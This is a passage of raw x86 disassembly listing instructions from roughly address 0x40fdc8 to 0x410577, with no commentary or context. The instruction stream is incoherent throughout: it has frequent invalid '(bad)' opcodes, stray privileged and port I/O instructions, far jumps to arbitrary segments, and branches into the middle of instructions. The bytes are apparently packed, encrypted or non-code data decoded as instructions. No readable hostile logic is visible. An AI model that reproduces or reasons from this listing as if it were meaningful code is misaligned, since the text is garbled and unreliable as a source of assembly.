  40fdc8:	and    bh,BYTE PTR gs:[esi]
  40fdcb:	add    DWORD PTR [edx-0x7d],esp
  40fdce:	icebp  
  40fdcf:	cli    
  40fdd0:	push   edx
  40fdd1:	jge    0x40fd65
  40fdd3:	cmc    
  40fdd4:	or     al,0x44
  40fdd6:	xchg   esi,eax
  40fdd7:	sbb    al,0x30
  40fdd9:	or     bl,bh
  40fddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fddc:	in     al,0xc5
  40fdde:	cmp    eax,DWORD PTR [esi+0x496a481f]
  40fde4:	adc    al,0x8b
  40fde6:	sub    BYTE PTR [ecx-0x64],al
  40fde9:	xchg   ebx,eax
  40fdea:	adc    al,0x75
  40fdec:	mov    ds:0x95b40cb0,eax
  40fdf1:	mov    al,ds:0xeb64fba2
  40fdf6:	nop
  40fdf7:	xchg   edi,eax
  40fdf8:	push   ss
  40fdf9:	add    DWORD PTR [edx],ebx
  40fdfb:	jbe    0x40fe0b
  40fdfd:	xchg   edi,eax
  40fdfe:	popa   
  40fdff:	in     eax,0x82
  40fe01:	push   edx
  40fe02:	jne    0x40fe1f
  40fe04:	ins    DWORD PTR es:[edi],dx
  40fe05:	fwait
  40fe06:	in     eax,0xf3
  40fe08:	mov    edi,0x58479f1d
  40fe0d:	push   eax
  40fe0e:	fsubr  DWORD PTR [edi+0x2f]
  40fe11:	imul   ebp,DWORD PTR [ecx],0x646737a
  40fe17:	or     DWORD PTR [esi-0x6be816b4],0x40706fee
  40fe21:	adc    ebp,DWORD PTR [ebp+edi*2+0x243ce2d8]
  40fe28:	jne    0x40fe7d
  40fe2a:	inc    edi
  40fe2b:	in     eax,0xa9
  40fe2d:	add    eax,0xa6a35760
  40fe32:	into   
  40fe33:	mov    ah,0x68
  40fe35:	std    
  40fe36:	xor    bh,BYTE PTR [esi+0x3]
  40fe39:	dec    ebp
  40fe3a:	(bad)  
  40fe3b:	cmp    dh,cl
  40fe3d:	es cmc 
  40fe3f:	inc    eax
  40fe40:	push   cs
  40fe41:	push   ds
  40fe42:	out    0x64,al
  40fe44:	std    
  40fe45:	mov    ecx,0xa74f82f8
  40fe4a:	pop    ss
  40fe4b:	jbe    0x40fe27
  40fe4d:	mov    edi,0x6de9c1b
  40fe52:	mov    bh,al
  40fe54:	iret   
  40fe55:	(bad)  
  40fe56:	(bad)  
  40fe57:	sub    ebx,DWORD PTR [esi+0x59efcf4e]
  40fe5d:	xlat   BYTE PTR ds:[ebx]
  40fe5e:	mov    dl,0xf5
  40fe60:	jb     0x40feb5
  40fe62:	cmp    edi,esi
  40fe64:	psubw  mm2,mm6
  40fe67:	repz ret 
  40fe69:	jae    0x40fee4
  40fe6b:	sub    ebp,DWORD PTR [esi-0x590d8180]
  40fe71:	aaa    
  40fe72:	daa    
  40fe73:	das    
  40fe74:	push   ebx
  40fe75:	add    esp,edi
  40fe77:	pop    edi
  40fe78:	cmc    
  40fe79:	cmp    BYTE PTR cs:[ecx],0x4f
  40fe7d:	pop    edi
  40fe7e:	imul   esi,DWORD PTR [eax+esi*8],0xffffffde
  40fe82:	cdq    
  40fe83:	lea    edi,[ebx]
  40fe85:	iret   
  40fe86:	mov    bl,0xc4
  40fe88:	sbb    BYTE PTR [ebx-0x72f0fac5],0x3
  40fe8f:	(bad)  
  40fe90:	dec    eax
  40fe91:	adc    al,0xbe
  40fe94:	jne    0x40fe89
  40fe96:	shl    DWORD PTR [edi-0x4e],1
  40fe99:	frstor [ebp-0x7]
  40fe9c:	int    0xb
  40fe9e:	iret   
  40fe9f:	iret   
  40fea0:	iret   
  40fea1:	ficomp WORD PTR gs:[ebx]
  40fea4:	stos   DWORD PTR es:[edi],eax
  40fea5:	iret   
  40fea6:	xchg   DWORD PTR [esp+ecx*1+0xf],esp
  40feaa:	add    ebp,DWORD PTR [esi+esi*2]
  40fead:	or     edx,DWORD PTR [eax-0x67]
  40feb0:	xchg   ebp,eax
  40feb1:	fadd   QWORD PTR [edi+0x16]
  40feb4:	cwde   
  40feb5:	and    edi,edi
  40feb7:	inc    ebx
  40feb8:	dec    esi
  40feb9:	(bad)  
  40febb:	iret   
  40febc:	xor    eax,0xd5677d9
  40fec1:	and    al,0x1
  40fec3:	fisubr WORD PTR [ecx+0x38]
  40fec6:	mov    ds:0x21c2824b,al
  40fecb:	add    DWORD PTR [edi+0x39],0x47
  40fecf:	(bad)  
  40fed0:	pop    esp
  40fed1:	out    dx,eax
  40fed2:	out    dx,eax
  40fed3:	inc    BYTE PTR [ecx-0x2f68d025]
  40fed9:	xor    eax,0xf2e4404
  40fedf:	pusha  
  40fee0:	ret    
  40fee1:	lds    ebp,FWORD PTR [ecx]
  40fee3:	jmp    0x8bbfc936
  40fee8:	fs mov ebp,0xd2c041a7
  40feee:	bound  esp,QWORD PTR [eax]
  40fef0:	daa    
  40fef1:	inc    edi
  40fef2:	pop    es
  40fef3:	or     al,BYTE PTR [ecx+0x43]
  40fef6:	stc    
  40fef7:	rcl    BYTE PTR [edi-0x7dda8e77],0x46
  40fefe:	addr16 inc edi
  40ff00:	inc    ebp
  40ff01:	icebp  
  40ff02:	sub    esp,DWORD PTR [edi-0x61bf54b5]
  40ff08:	iret   
  40ff09:	xor    ebp,esi
  40ff0b:	sbb    eax,0xfaeea12
  40ff10:	pop    ebx
  40ff11:	fbstp  TBYTE PTR fs:[ecx]
  40ff14:	push   ds
  40ff15:	adc    al,0x4
  40ff17:	mov    ch,BYTE PTR [edx]
  40ff19:	imul   edi,DWORD PTR [ecx+0x60765977],0xffffff82
  40ff20:	mov    ebp,0x48675756
  40ff25:	push   ss
  40ff26:	pop    edx
  40ff27:	mov    dl,0x26
  40ff29:	test   BYTE PTR [esp+eiz*4+0xd],al
  40ff2d:	inc    esi
  40ff2e:	or     DWORD PTR [ebp+0x3e88eb69],ebx
  40ff34:	or     eax,0xaaf461a6
  40ff39:	add    esi,DWORD PTR [edi-0x41ff445]
  40ff3f:	xor    esi,eax
  40ff41:	jmp    0x3add:0xcf431de1
  40ff48:	mov    edi,0xe6d525cf
  40ff4d:	sub    al,0x27
  40ff4f:	inc    ebx
  40ff50:	imul   edi,DWORD PTR [edx],0x1687312
  40ff56:	dec    ebp
  40ff57:	clc    
  40ff58:	pop    esp
  40ff59:	mov    ecx,DWORD PTR [edx-0x4a]
  40ff5c:	inc    eax
  40ff5d:	jl     0x40ffd5
  40ff5f:	jno    0x40ff7a
  40ff61:	in     al,dx
  40ff62:	les    edi,FWORD PTR [ebx-0x3ee20011]
  40ff68:	subps  xmm2,xmm4
  40ff6b:	add    esi,DWORD PTR [eax+0x40]
  40ff6e:	shr    BYTE PTR [edx],0x4d
  40ff71:	rol    DWORD PTR [ecx-0x596c92ee],1
  40ff77:	inc    esi
  40ff78:	adc    BYTE PTR [esi-0x16874cca],0x12
  40ff7f:	xor    esi,esp
  40ff81:	scas   al,BYTE PTR es:[edi]
  40ff82:	xchg   edi,eax
  40ff83:	mov    ch,0x8d
  40ff85:	push   edi
  40ff86:	mov    DWORD PTR [edi],ebx
  40ff88:	pop    ds
  40ff89:	in     al,dx
  40ff8a:	mov    ds:0x5afeba2b,eax
  40ff8f:	add    eax,0x42540219
  40ff94:	jnp    0x40ff64
  40ff96:	push   esp
  40ff97:	xchg   esp,eax
  40ff98:	imul   edi,ecx,0xffffffe8
  40ff9b:	clc    
  40ff9c:	shl    BYTE PTR [edi],cl
  40ff9e:	and    BYTE PTR [esi],bl
  40ffa0:	test   eax,0x937e61cc
  40ffa5:	sbb    BYTE PTR [eax+esi*1+0xfdaf411],bl
  40ffac:	jb     0x40ff37
  40ffae:	in     al,0xca
  40ffb0:	dec    ecx
  40ffb1:	adc    eax,0x4ec1b8b8
  40ffb6:	call   esi
  40ffb8:	call   0x3485:0x6e3898b4
  40ffbf:	inc    ebp
  40ffc0:	int3   
  40ffc1:	std    
  40ffc2:	(bad)  
  40ffc3:	mov    ds:0xd3280003,al
  40ffc8:	xlat   BYTE PTR ds:[ebx]
  40ffc9:	pop    edx
  40ffca:	jae    0x40ff61
  40ffcc:	ds mov dl,0x3
  40ffcf:	push   edx
  40ffd0:	ficomp WORD PTR [ebp+0x9407c33]
  40ffd6:	js     0x41004c
  40ffd8:	jp     0x40ffcd
  40ffda:	outs   dx,DWORD PTR ds:[esi]
  40ffdb:	mul    DWORD PTR [esi]
  40ffdd:	inc    esi
  40ffde:	push   es
  40ffdf:	cmp    BYTE PTR [ebx+0x1dd85821],ch
  40ffe5:	push   eax
  40ffe6:	pop    esi
  40ffe7:	jmp    0x71bd:0x92d0bb92
  40ffee:	pop    ecx
  40ffef:	das    
  40fff0:	jmp    0x79b0e68b
  40fff5:	push   ebx
  40fff6:	cmp    ebp,ebp
  40fff8:	mov    dh,0x8b
  40fffa:	pop    eax
  40fffb:	stos   DWORD PTR es:[edi],eax
  40fffc:	cmp    al,0x7a
  40fffe:	xlat   BYTE PTR ds:[ebx]
  40ffff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410000:	test   al,0xa4
  410002:	mov    edi,DWORD PTR [ecx]
  410004:	mov    edi,DWORD PTR [edi+0x269278b1]
  41000a:	xchg   DWORD PTR [esi+0x7e1ea227],ebp
  410010:	in     eax,dx
  410011:	or     DWORD PTR [esi+0x29f3033d],edx
  410017:	mov    BYTE PTR gs:[eax-0x61],al
  41001b:	pop    ebx
  41001c:	pop    ecx
  41001d:	mov    edi,DWORD PTR [ecx]
  41001f:	and    bl,0x3e
  410022:	jp     0x40ffbd
  410024:	(bad)  [esp+ebp*8+0x3e]
  410028:	int    0xa7
  41002a:	cmp    cl,BYTE PTR [ebp+0x32c6f20b]
  410030:	mov    BYTE PTR [ebx],bl
  410032:	daa    
  410033:	int3   
  410034:	jns    0x410010
  410036:	ins    BYTE PTR es:[edi],dx
  410037:	mov    ds:0x995257e,al
  41003c:	fucomi st,st(1)
  41003e:	inc    edi
  41003f:	add    ecx,DWORD PTR [ebx]
  410041:	push   ebx
  410042:	mov    bl,0x92
  410044:	push   edi
  410045:	push   0xb3ba6606
  41004a:	pop    edi
  41004b:	mov    eax,ds:0x95a068a5
  410050:	pop    edx
  410051:	adc    bl,BYTE PTR [eax-0x34]
  410054:	fistp  QWORD PTR [eax]
  410056:	add    eax,ebx
  410058:	push   ds
  410059:	push   0x50
  41005b:	jno    0x410032
  41005d:	xchg   edi,eax
  41005e:	jp     0x410099
  410060:	inc    edx
  410061:	pop    ecx
  410062:	cmc    
  410063:	mov    dl,0x6e
  410065:	or     esp,ebx
  410067:	mov    eax,ds:0xdd7d8ab0
  41006c:	push   ds
  41006d:	push   0x8
  41006f:	push   edx
  410070:	inc    ax
  410072:	ins    BYTE PTR es:[edi],dx
  410073:	pop    ecx
  410074:	fbld   TBYTE PTR [ebx+0x51]
  410077:	adc    al,0x57
  410079:	call   0x8126a433
  41007e:	std    
  41007f:	mov    ebx,0x1611075d
  410084:	ss adc eax,0xdab0dcf1
  41008a:	or     al,0x34
  41008c:	out    dx,eax
  41008d:	push   ecx
  41008e:	mov    eax,0x5b8e4ee7
  410093:	imul   ecx,eax,0xa3cb5869
  410099:	or     cl,BYTE PTR [edx+0x6ff772b0]
  41009f:	adc    DWORD PTR [esi+edi*2+0x1ffcb381],esi
  4100a6:	pop    ss
  4100a7:	imul   DWORD PTR [esi]
  4100a9:	add    BYTE PTR [edx+eax*2],ch
  4100ac:	in     al,dx
  4100ad:	sub    al,0xe5
  4100af:	jg     0x41003f
  4100b1:	icebp  
  4100b2:	pop    ebp
  4100b3:	pop    es
  4100b4:	or     ch,cl
  4100b6:	pop    ecx
  4100b7:	inc    ebx
  4100b8:	stc    
  4100b9:	mov    bh,0x5b
  4100bb:	add    edi,DWORD PTR [ebx]
  4100bd:	bnd ja 0x4100bf
  4100c0:	mov    eax,0xfe577626
  4100c5:	cmp    esp,0xa42c97d0
  4100cb:	rcl    DWORD PTR [edi],1
  4100cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100ce:	add    BYTE PTR [ebp-0x38],ah
  4100d1:	rol    DWORD PTR [ebx+edi*4+0x6ffc728a],cl
  4100d8:	xor    eax,0x7e623dfb
  4100dd:	aad    0x14
  4100df:	pop    ecx
  4100e0:	xor    al,0xc4
  4100e2:	add    DWORD PTR [ecx-0x459bc199],ebx
  4100e8:	mov    dh,0x9c
  4100ea:	(bad)  
  4100eb:	mov    al,0xc6
  4100ed:	call   0x8e17360a
  4100f2:	pop    edi
  4100f3:	mov    al,0xa5
  4100f5:	pmaddwd mm2,QWORD PTR [esi+0x4f]
  4100f9:	cwde   
  4100fa:	sti    
  4100fb:	sbb    BYTE PTR [eax-0x28b364c3],dl
  410101:	fdiv   DWORD PTR [edi]
  410103:	mov    ah,0xc
  410105:	adc    eax,0xcc9f62dd
  41010a:	pushf  
  41010b:	push   ss
  41010c:	arpl   WORD PTR [ebx+0x77de109],di
  410112:	stos   BYTE PTR es:[edi],al
  410113:	cmp    DWORD PTR [edi+0x2747955c],esp
  410119:	ret    
  41011a:	sub    al,0x53
  41011c:	std    
  41011d:	xor    eax,0xdb040e7a
  410122:	push   cs
  410123:	nop
  410124:	dec    eax
  410125:	test   esp,0x77593f26
  41012b:	jb     0x4101ab
  41012d:	mov    eax,0xa82b1999
  410132:	fimul  WORD PTR [ebp-0x41]
  410135:	pop    esi
  410136:	imul   edx,DWORD PTR [esi+esi*8-0x52],0x3b
  41013b:	or     al,BYTE PTR [eax-0xb80f36c]
  410141:	mov    ds:0x1f28d750,eax
  410146:	xchg   BYTE PTR fs:[ebp-0x2a],cl
  41014a:	jge    0x410137
  41014c:	int    0xfc
  41014e:	aam    0x1c
  410150:	aam    0xa9
  410152:	xchg   esi,eax
  410153:	and    esi,esi
  410155:	xchg   esp,eax
  410156:	adc    BYTE PTR [edx-0x47b3c080],dl
  41015c:	cli    
  41015d:	jecxz  0x4101a5
  41015f:	hlt    
  410160:	inc    esp
  410161:	push   ds
  410162:	xchg   dh,cl
  410164:	sub    dh,BYTE PTR [edx]
  410166:	cmc    
  410167:	popf   
  410168:	push   ebx
  410169:	xchg   edi,eax
  41016a:	pop    ecx
  41016b:	pop    edi
  41016c:	pushf  
  41016d:	mov    BYTE PTR [ebp-0x3b02862f],cl
  410173:	sbb    al,0x9f
  410175:	lds    esi,FWORD PTR [eax-0x6063de1d]
  41017b:	rcl    BYTE PTR [edi-0x3317c1c1],cl
  410181:	add    eax,0xf6df9c89
  410186:	hlt    
  410187:	clc    
  410188:	or     edi,DWORD PTR [ebp-0x61]
  41018b:	mov    ds:0x43971c30,al
  410190:	jb     0x41018e
  410192:	stc    
  410193:	jns    0x4101ee
  410195:	pop    edx
  410196:	dec    esi
  410197:	fiadd  DWORD PTR [edi]
  410199:	adc    DWORD PTR [esi],ecx
  41019b:	add    al,0x72
  41019d:	mov    ds:0x5a0ffa6,eax
  4101a2:	sbb    al,0x7
  4101a4:	enter  0x83dd,0x1f
  4101a8:	sub    eax,ebp
  4101aa:	test   BYTE PTR [ebp-0x678b70a6],al
  4101b0:	adc    DWORD PTR [ebp-0x56528564],ebx
  4101b6:	mov    DWORD PTR [ebp+0x34],edi
  4101b9:	(bad)  
  4101ba:	mov    DWORD PTR [eax-0x6659f873],esp
  4101c0:	test   eax,0xd3897502
  4101c5:	loope  0x4101d3
  4101c7:	enter  0x8b12,0xc
  4101cb:	ins    BYTE PTR es:[edi],dx
  4101cc:	ror    DWORD PTR [eax+0x76],cl
  4101cf:	stc    
  4101d0:	arpl   WORD PTR [eax-0x72],ax
  4101d3:	gs jle 0x41021c
  4101d6:	mov    DWORD PTR [esi+ebp*8],ebx
  4101d9:	push   0xffffffd3
  4101db:	shl    DWORD PTR [edx],cl
  4101dd:	fmul   QWORD PTR [ebp+0x5c]
  4101e0:	sub    al,0xc
  4101e2:	xchg   edx,eax
  4101e3:	popa   
  4101e4:	or     ebx,DWORD PTR [ebx+0x3b]
  4101e7:	mov    al,ds:0xd0d8c530
  4101ec:	inc    edi
  4101ed:	mov    eax,0x82937436
  4101f2:	fbld   TBYTE PTR [esi+0x5ba24fa2]
  4101f8:	cmp    ebx,0x7b
  4101fb:	inc    edx
  4101fc:	arpl   sp,si
  4101fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101ff:	cld    
  410200:	mov    esi,0x64e541ff
  410205:	leave  
  410206:	sub    eax,0x475bf588
  41020b:	jae    0x41025a
  41020d:	pop    esi
  41020e:	inc    ebp
  41020f:	out    dx,eax
  410210:	adc    eax,0xc31d446e
  410215:	push   0xe72db87a
  41021a:	adc    DWORD PTR [ebx-0x40],0xffffffe0
  41021e:	mov    WORD PTR [esi-0x36562a19],es
  410224:	sahf   
  410225:	lods   al,BYTE PTR ds:[esi]
  410226:	fsubr  st,st(1)
  410228:	cmp    BYTE PTR [eax],dl
  41022a:	rol    BYTE PTR [esi+0x79a69b12],0x71
  410231:	sub    esi,eax
  410233:	cmp    DWORD PTR [ebx+ebx*2+0x4b2b77db],esi
  41023a:	fdiv   st,st(7)
  41023c:	loop   0x4101f3
  41023e:	and    ebp,eax
  410240:	shl    BYTE PTR [ecx],cl
  410242:	adc    bx,WORD PTR [ecx+0x13f387bf]
  410249:	jns    0x410263
  41024b:	xchg   edi,eax
  41024c:	jne    0x4102cb
  41024e:	and    DWORD PTR [ebp-0x59eb112c],ebp
  410254:	sub    al,0xfc
  410256:	cwde   
  410257:	dec    ecx
  410258:	sahf   
  410259:	mov    ecx,0x1eff9a25
  41025e:	hlt    
  41025f:	std    
  410260:	or     ch,bh
  410262:	adc    eax,edi
  410264:	inc    edi
  410265:	mov    ecx,0xa713f178
  41026a:	or     al,0x9a
  41026c:	push   0x2a
  41026e:	push   edx
  41026f:	int3   
  410270:	cmp    esp,DWORD PTR [edx+0x4a]
  410273:	daa    
  410274:	push   0x81dfab99
  410279:	in     eax,dx
  41027a:	call   0x333871cc
  41027f:	hlt    
  410280:	daa    
  410281:	add    DWORD PTR ds:0x81989787,0xffffffaf
  410288:	dec    edi
  410289:	popa   
  41028a:	push   esi
  41028b:	imul   ebp,DWORD PTR [edx-0x24572ef],0xb5c0eaf1
  410295:	aas    
  410296:	popa   
  410297:	(bad)  
  410298:	les    esp,FWORD PTR ds:0x3c11ad81
  41029e:	cmp    bh,ch
  4102a0:	jle    0x4102f0
  4102a2:	adc    al,0x9d
  4102a4:	cwde   
  4102a5:	cmp    ecx,esp
  4102a7:	stos   BYTE PTR es:[edi],al
  4102a8:	retf   
  4102a9:	xor    BYTE PTR [edi-0x15042358],0x31
  4102b0:	aad    0x66
  4102b2:	add    ebx,ebp
  4102b4:	add    BYTE PTR [esi-0xf],0xbf
  4102b8:	in     eax,0xfb
  4102ba:	out    dx,eax
  4102bb:	cmc    
  4102bc:	push   eax
  4102bd:	or     eax,0x212cacd7
  4102c2:	outs   dx,DWORD PTR ds:[esi]
  4102c3:	(bad)  
  4102c4:	mov    ch,BYTE PTR [edi-0x67]
  4102c7:	dec    esp
  4102c8:	scas   eax,DWORD PTR es:[edi]
  4102c9:	ret    0x19f0
  4102cc:	mov    WORD PTR [eax+edx*2-0xf],?
  4102d0:	in     al,0x82
  4102d2:	(bad)  
  4102d3:	in     al,dx
  4102d4:	jl     0x4102fe
  4102d6:	imul   edi,DWORD PTR [esi+0x12],0x7d
  4102da:	pushf  
  4102db:	fadd   DWORD PTR ds:0x8e0f82c
  4102e1:	fisub  DWORD PTR [eax+0x63]
  4102e4:	iret   
  4102e5:	lea    ebx,es:[esi+edi*8-0x5c]
  4102ea:	sub    BYTE PTR [ebp-0x7c],ch
  4102ed:	or     al,0xeb
  4102ef:	add    ebp,DWORD PTR [eax+ebp*8-0x7a]
  4102f3:	loop   0x4102e3
  4102f5:	sub    al,0x16
  4102f7:	xchg   edi,eax
  4102f8:	into   
  4102f9:	dec    esi
  4102fa:	lds    ebx,FWORD PTR [edi+0x2f2c8880]
  410300:	(bad)  
  410301:	dec    edi
  410302:	(bad)  
  410303:	pop    ds
  410304:	mov    ah,ch
  410306:	adc    DWORD PTR [ebx-0x36d72e4e],esp
  41030c:	cmp    eax,DWORD PTR [esi+0x72]
  41030f:	inc    edx
  410310:	xor    BYTE PTR [eax-0x3f],bh
  410313:	enter  0xa3c7,0x72
  410317:	in     al,0xc7
  410319:	cmc    
  41031a:	xchg   edi,eax
  41031b:	std    
  41031c:	cmp    DWORD PTR [ecx+0xb],esp
  41031f:	pushf  
  410320:	pop    esi
  410321:	or     al,0xbc
  410323:	cwde   
  410324:	aas    
  410325:	jmp    0x350:0x80e98f45
  41032c:	scas   eax,DWORD PTR es:[edi]
  41032d:	jg     0x4102dd
  41032f:	pusha  
  410330:	mov    al,ds:0x48b0269a
  410335:	sub    bl,BYTE PTR [ecx]
  410337:	mov    ch,0x32
  410339:	imul   DWORD PTR [ebx+0x63b4356]
  41033f:	xor    BYTE PTR [ebx-0x29953c9d],ah
  410345:	dec    esi
  410346:	sub    dh,BYTE PTR [esi]
  410348:	popf   
  410349:	sub    esi,esi
  41034b:	and    BYTE PTR [eax],0x9b
  41034e:	pop    ds
  41034f:	gs int 0x88
  410352:	into   
  410353:	iret   
  410354:	mov    WORD PTR [edi],?
  410356:	adc    esp,DWORD PTR [ecx]
  410358:	jmp    0xebc5bea2
  41035d:	mov    edx,0xb4d4ca08
  410362:	jecxz  0x4102ee
  410364:	daa    
  410365:	or     edi,DWORD PTR [edi+0x10e4c39b]
  41036b:	(bad)  
  41036c:	retf   
  41036d:	push   cs
  41036e:	mov    al,ds:0x7b85c86f
  410373:	xchg   ebp,eax
  410374:	xchg   edi,eax
  410375:	rcr    BYTE PTR [ecx],1
  410377:	out    0x91,eax
  410379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41037a:	dec    BYTE PTR [esp+ecx*8]
  41037d:	sbb    BYTE PTR [ebx+0x25806802],al
  410383:	xor    eax,0xd1ea49bb
  410388:	dec    edx
  410389:	pushf  
  41038a:	xor    al,0x3f
  41038c:	push   ebx
  41038d:	pop    ss
  41038e:	nop    DWORD PTR [ebp+edi*2-0x4c]
  410393:	out    dx,al
  410394:	pop    eax
  410395:	jecxz  0x41034e
  410397:	je     0x41035f
  410399:	xchg   BYTE PTR [ecx+0x7a],ch
  41039c:	pusha  
  41039d:	ret    0xdef6
  4103a0:	pop    edx
  4103a1:	addr16 xchg ecx,eax
  4103a3:	stos   DWORD PTR es:[edi],eax
  4103a4:	mov    dh,BYTE PTR [ecx-0x34]
  4103a7:	inc    ebp
  4103a8:	sub    ebx,DWORD PTR [esi-0x1b35819a]
  4103ae:	jecxz  0x41034c
  4103b0:	sub    eax,ebx
  4103b2:	ss ret 0xdc03
  4103b6:	push   eax
  4103b7:	xor    BYTE PTR [ebx-0x2f],ah
  4103ba:	je     0x4103eb
  4103bc:	mov    BYTE PTR [edi+ecx*1+0x55d73b04],bl
  4103c3:	out    dx,al
  4103c4:	jae    0x4103de
  4103c6:	mov    ecx,0x75f113a8
  4103cb:	add    cl,bh
  4103cd:	inc    ecx
  4103ce:	pop    es
  4103cf:	rcl    DWORD PTR [ebx],1
  4103d1:	push   edi
  4103d2:	push   ebx
  4103d3:	adc    eax,0x88a53e9f
  4103d8:	out    dx,eax
  4103d9:	jno    0x41036b
  4103db:	popf   
  4103dc:	mov    ds:0xf322d6aa,eax
  4103e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103e2:	aam    0x84
  4103e4:	data16 int3 
  4103e6:	jne    0x4103ca
  4103e8:	push   ss
  4103e9:	pop    edi
  4103ea:	fwait
  4103eb:	pop    es
  4103ec:	std    
  4103ed:	xchg   ebx,eax
  4103ee:	inc    ebx
  4103ef:	or     eax,0x684fc237
  4103f4:	jl     0x4103e5
  4103f6:	and    al,0x9c
  4103f8:	stc    
  4103f9:	int3   
  4103fa:	inc    esp
  4103fb:	std    
  4103fc:	ins    BYTE PTR es:[edi],dx
  4103fd:	jecxz  0x410421
  4103ff:	sub    ebp,DWORD PTR [edi+esi*4+0x3777eb]
  410406:	(bad)  
  410407:	mov    ch,0xdb
  410409:	jns    0x410440
  41040b:	loopne 0x4103d0
  41040d:	cld    
  41040e:	xchg   ebx,eax
  41040f:	shl    DWORD PTR [esi-0x2cb27225],cl
  410415:	cwde   
  410416:	(bad)  
  410417:	cli    
  410418:	call   0x5bc6a90f
  41041d:	pushf  
  41041e:	add    DWORD PTR [edi+0xc89fe6d],ebx
  410424:	add    al,bl
  410426:	test   eax,0x418161aa
  41042b:	adc    edx,ecx
  41042d:	imul   eax,DWORD PTR [edi+0xe5a536b],0x4202a51b
  410437:	push   ss
  410438:	sbb    DWORD PTR [ebx],ebx
  41043a:	mov    edi,0x43f05f55
  41043f:	mov    bl,BYTE PTR [edi+0x66]
  410442:	test   BYTE PTR [edx+0x4d],ch
  410445:	cmp    BYTE PTR [ecx],dl
  410447:	es leave 
  410449:	outs   dx,DWORD PTR ds:[esi]
  41044a:	arpl   WORD PTR [edx-0x20],dx
  41044d:	xchg   ebx,eax
  41044e:	in     eax,dx
  41044f:	push   ss
  410450:	mov    dl,0x4a
  410452:	pop    ss
  410453:	inc    ecx
  410454:	sahf   
  410455:	pop    ss
  410456:	daa    
  410457:	jle    0x41040c
  410459:	hlt    
  41045a:	shr    BYTE PTR [ebp+0x315a1276],0x3a
  410461:	mov    ah,0xc
  410463:	hlt    
  410464:	fstp   DWORD PTR [esi+0x76]
  410467:	(bad)  [ecx+0x6b]
  41046a:	sub    ch,ch
  41046c:	in     eax,dx
  41046d:	outs   dx,DWORD PTR ds:[esi]
  41046e:	lds    edx,FWORD PTR [edx+0x4325b91d]
  410474:	sbb    BYTE PTR [esi],al
  410476:	mov    ch,BYTE PTR [edx-0x3b]
  410479:	jno    0x4104cc
  41047b:	fld    QWORD PTR [edi]
  41047d:	ins    BYTE PTR es:[edi],dx
  41047e:	sti    
  41047f:	sub    edi,DWORD PTR [ecx]
  410481:	pop    ebp
  410482:	add    DWORD PTR [eax+eax*2-0x5fb57d4b],edi
  410489:	(bad)  
  41048b:	mov    al,0xca
  41048d:	push   edx
  41048e:	outs   dx,BYTE PTR ds:[esi]
  41048f:	pop    edi
  410490:	cmp    esp,DWORD PTR [ebx]
  410492:	adc    ecx,esi
  410494:	aam    0x6
  410496:	inc    ebp
  410497:	xchg   ebp,eax
  410498:	pop    ebp
  410499:	mov    edx,DWORD PTR [edx-0x1b]
  41049c:	xor    al,0x9b
  41049e:	xchg   esp,eax
  41049f:	mov    WORD PTR [eax-0x6d],es
  4104a2:	jbe    0x410453
  4104a4:	stos   DWORD PTR es:[edi],eax
  4104a5:	jmp    0x2f74ce03
  4104aa:	iret   
  4104ab:	or     al,dh
  4104ad:	sbb    bh,BYTE PTR [edx-0x66046639]
  4104b3:	xor    DWORD PTR [edx+0x43],0x71284a14
  4104ba:	popa   
  4104bb:	pusha  
  4104bc:	jae    0x410513
  4104be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104bf:	sti    
  4104c0:	les    edi,FWORD PTR [eax-0x5b352eb5]
  4104c6:	(bad)  
  4104c8:	mov    eax,ds:0xf12df713
  4104cd:	and    eax,0x5bf8ba34
  4104d2:	lahf   
  4104d3:	push   0x6f2952d5
  4104d8:	adc    BYTE PTR [ecx+eiz*8],ch
  4104db:	bound  ecx,QWORD PTR [esi-0x1dc2776a]
  4104e1:	add    cl,BYTE PTR [edx]
  4104e3:	fwait
  4104e4:	nop
  4104e5:	in     al,dx
  4104e6:	lea    edi,[esi+0x56a7089b]
  4104ec:	push   cs
  4104ed:	(bad)  
  4104ee:	js     0x410561
  4104f0:	and    al,0xe8
  4104f2:	pop    ss
  4104f3:	xchg   ebp,eax
  4104f4:	xchg   ebp,eax
  4104f5:	test   bh,al
  4104f7:	mov    ch,BYTE PTR [ebp-0x366553d4]
  4104fd:	je     0x410521
  4104ff:	loope  0x410505
  410501:	xchg   esp,eax
  410502:	dec    edx
  410503:	imul   esi,DWORD PTR [ecx],0xf89501
  410509:	test   al,0x30
  41050b:	pop    esi
  41050c:	xlat   BYTE PTR ds:[ebx]
  41050d:	loop   0x410510
  41050f:	adc    dh,BYTE PTR ss:[ebp-0x7f]
  410513:	scas   al,BYTE PTR es:[edi]
  410514:	retf   0x62b5
  410517:	cwde   
  410518:	and    eax,0x1d8fd48b
  41051d:	out    dx,al
  41051e:	fisttp DWORD PTR [ebp+0x7f]
  410521:	pop    esp
  410522:	xchg   DWORD PTR [eax+0x3122db1c],ecx
  410528:	sbb    eax,0xa36e886b
  41052d:	lahf   
  41052e:	lods   eax,DWORD PTR ds:[esi]
  41052f:	xor    eax,0x1a9d6fec
  410534:	int3   
  410535:	not    BYTE PTR [ebx+0x47]
  410538:	xor    al,BYTE PTR [ebx]
  41053a:	mov    al,ds:0xed407dbc
  41053f:	jmp    0x5427e4af
  410544:	pop    es
  410545:	push   esp
  410546:	or     cl,BYTE PTR [ebx-0x45]
  410549:	outs   dx,DWORD PTR ds:[esi]
  41054a:	lods   eax,DWORD PTR ds:[esi]
  41054b:	test   DWORD PTR [edi+ebx*1-0x4c],esi
  41054f:	sahf   
  410550:	icebp  
  410551:	sub    BYTE PTR [edx+0x29477dcd],0xfc
  410558:	xor    BYTE PTR [eax],bh
  41055a:	dec    eax
  41055b:	sar    BYTE PTR [eax],cl
  41055d:	out    dx,al
  41055e:	stos   DWORD PTR es:[edi],eax
  41055f:	add    eax,0x353559d4
  410564:	cs (bad) 
  410566:	pop    esi
  410567:	outs   dx,DWORD PTR ds:[esi]
  410568:	retf   
  410569:	std    
  41056a:	sbb    cl,ah
  41056c:	pop    ds
  41056d:	sbb    eax,0xb5ab0714
  410572:	or     eax,0xd6b73e18
  410577:	mov    bl,0x5d
